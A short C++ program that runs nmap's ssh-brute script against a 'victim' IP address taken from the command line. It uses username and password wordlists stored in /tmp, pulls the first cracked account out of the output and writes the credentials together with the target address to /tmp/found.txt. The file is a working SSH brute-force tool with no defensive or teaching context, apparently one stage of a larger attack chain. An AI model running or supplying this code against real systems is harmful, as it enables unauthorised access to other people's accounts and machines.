#include <iostream>
#include <fstream>

/* Starting from common usernames and passwords, tries to find accounts' credentials 
using nmap's ssh-brute script against the specified ip address */
int main(int argc, char* argv[]){
    if(argc < 2) exit(EXIT_FAILURE);
    std::string victim = argv[1];
    std::string cmd = "nmap -p 22 --script ssh-brute --script-args userdb=/tmp/usernames.txt,passdb=/tmp/passwords.txt "+victim;
    FILE *fp = popen(cmd.c_str(), "r");
    char res[500];
    std::string name_psw;
    bool accounts = false;
    while (fgets(res,sizeof(res),fp)){
        if(accounts){
            name_psw = std::string(res);
            break;
        }
        if(std::string(res).find("Accounts") != std::string::npos) accounts = true;
    }
    name_psw = name_psw.substr(6, name_psw.length());
    name_psw = name_psw.substr(0, name_psw.find(" "));
    std::ofstream("/tmp/found.txt")<< name_psw << ":" << victim << std::endl;
    return 0;
}